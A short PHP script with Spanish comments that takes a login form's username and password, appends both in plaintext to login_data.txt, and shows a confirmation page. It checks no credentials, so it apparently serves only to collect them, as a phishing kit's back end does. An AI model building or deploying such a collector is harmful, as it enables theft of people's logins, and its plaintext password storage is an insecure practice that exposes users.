<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Guardar los datos en un archivo local
    $file = fopen("login_data.txt", "a");
    fwrite($file, "Usuario: " . $usuario . " - Contraseña: " . $contraseña . "\n");
    fclose($file);

    // Mostrar mensaje y enlace para volver a index.html
    echo "<h2>Datos recibidos correctamente.</h2>";
    echo "<p>Usuario: " . htmlspecialchars($usuario) . "</p>";  // Mostrar el usuario (contraseña oculta por seguridad)
    echo "<p><a href='index.html'>Volver al inicio</a></p>";  // Enlace para volver a index.html
} else {
    echo "Método no permitido.";
}
?>
